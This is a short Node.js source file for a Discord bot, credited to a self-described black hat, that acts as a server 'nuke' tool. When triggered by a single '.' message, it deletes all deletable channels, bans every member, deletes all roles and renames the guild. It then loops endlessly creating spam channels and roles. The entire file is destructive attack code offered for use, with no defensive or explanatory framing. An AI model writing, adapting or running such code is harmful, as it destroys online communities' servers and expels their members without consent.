const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "PREFIX LERA DABNE";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("BY D1MOD");////NAWEK BO SERVERAKA DANE 
      setInterval(function() {
        message.guild.createChannel("BY D1MOD", "id text");///////bo channel 
        message.guild.createChannel("BY D1MOD", "id voice");////bo voice
        message.guild.createRole({ name: "BY D1MOD" });////NAWEK DABNE BO ROLE
      });
    }
  }
});

client.login("")

////////////////CODED BY D1MODˢᵘⁿ/ᵇˡᵃᶜᵏ ʰᵃᵗ#3415
